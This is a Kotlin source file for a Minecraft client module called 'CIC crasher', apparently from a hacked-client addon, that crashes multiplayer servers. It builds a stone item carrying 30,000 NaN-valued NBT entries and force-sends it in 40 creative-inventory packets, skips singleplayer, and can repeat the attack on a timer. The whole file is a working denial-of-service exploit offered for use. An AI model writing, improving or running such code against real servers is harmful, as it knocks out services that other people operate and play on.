package su.mandora.tarasande_crasher.module

import su.mandora.tarasande_crasher.forcePacket
import net.minecraft.item.ItemStack
import net.minecraft.item.Items
import net.minecraft.nbt.NbtCompound
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket
import su.mandora.tarasande.event.impl.EventDisconnect
import su.mandora.tarasande.event.impl.EventUpdate
import su.mandora.tarasande.mc
import su.mandora.tarasande.system.base.valuesystem.impl.ValueBoolean
import su.mandora.tarasande.system.base.valuesystem.impl.ValueNumber
import su.mandora.tarasande.system.feature.modulesystem.Module
import su.mandora.tarasande.util.math.TimeUtil

class ModuleCICCrasher : Module("CIC crasher", "Crashes the server using weird packets", "Crasher") {

    private val repeat = ValueBoolean(this, "Repeat", false)
    private val repeatDelay = ValueNumber(this, "Repeat delay", 500.0, 1000.0, 50000.0, 500.0, isEnabled = { repeat.value })

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) {
            if (repeat.value) {
                if (timer.hasReached(repeatDelay.value.toLong())) {
                    execute()
                    timer.reset()
                }
            }
        }
    }

    override fun onEnable() {
        super.onEnable()
        if (!repeat.value) execute()
    }

    private fun execute() {
        if (mc.isInSingleplayer) return

        ItemStack(Items.STONE).apply {
            val base = NbtCompound()
            var i = 0
            while (i < 30000) {
                base.putDouble(i.toString(), Double.NaN)
                i++
            }
            nbt = base

            var j = 0
            while (j < 40) {
                forcePacket(CreativeInventoryActionC2SPacket(j, this))
                j++
            }
        }
    }
}
